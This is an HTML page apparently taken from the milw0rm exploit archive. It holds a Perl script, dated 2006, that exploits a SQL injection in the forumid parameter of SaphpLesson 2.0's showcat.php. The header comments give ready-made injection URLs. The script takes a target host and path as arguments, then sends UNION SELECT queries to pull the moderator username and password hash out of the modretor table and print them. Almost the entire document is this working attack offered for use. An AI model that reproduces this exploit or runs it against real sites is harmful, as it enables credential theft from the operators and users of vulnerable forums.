<html><head><title>SaphpLesson 2.0 (forumid) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# For password
# http://www.example.com/path/showcat.php?forumid=-1%20union%20select%20ModPassword%20from%20modretor
# For username
# http://www.example.com/path/showcat.php?forumid=-1%20union%20select%20ModName%20from%20modretor
# sent in by SnIpEr_SA (selfar2002[at]hotmail.com)
# ported by str0ke (milw0rm.com)

use LWP::Simple;

$serv     =  $ARGV[0];
$path     =  $ARGV[1];

sub usage
 {
    print &quot;\nSaphpLesson 2.0 SQL-Injection \n&quot;;
    print &quot;By SnIpEr_SA Ported by str0ke\n&quot;;
    print &quot;Usage: $0 www.example.com /directory/\n&quot;;
    print &quot;sever    -  URL\n&quot;;
    print &quot;path     -  path to showcat.php\n&quot;;
    exit ();
}

sub exploit
 {
    print qq(
    SaphpLesson 2.0 SQL-Injection
    By SnIpEr_SA Ported by str0ke\n\n);

    $URL = sprintf(&quot;http://%s%sshowcat.php?forumid=-1+union+select+ModName+from+modretor&quot;,$serv,$path);
    $content = get &quot;$URL&quot;;
    if ($content =~ /(\[)(.*)(\]\&lt;\/title\&gt;)/){&amp;user;}else{print &quot;No Workie\n&quot;;}
    $URL = sprintf(&quot;http://%s%sshowcat.php?forumid=-1+union+select+ModPassword+from+modretor&quot;,$serv,$path);
    $content = get &quot;$URL&quot;;
    if ($content =~ /(\[)(\w{32})(\]\&lt;\/title\&gt;)/){&amp;showh;}else{print &quot;No Workie\n&quot;;}
}

sub user { print &quot;[*] Username: $2\n&quot;;}
sub showh { print &quot;[*] Hash: $2\n\n&quot;;}

if (@ARGV != 2){&amp;usage;}else{&amp;exploit;}

# milw0rm.com [2006-02-25]</pre></html>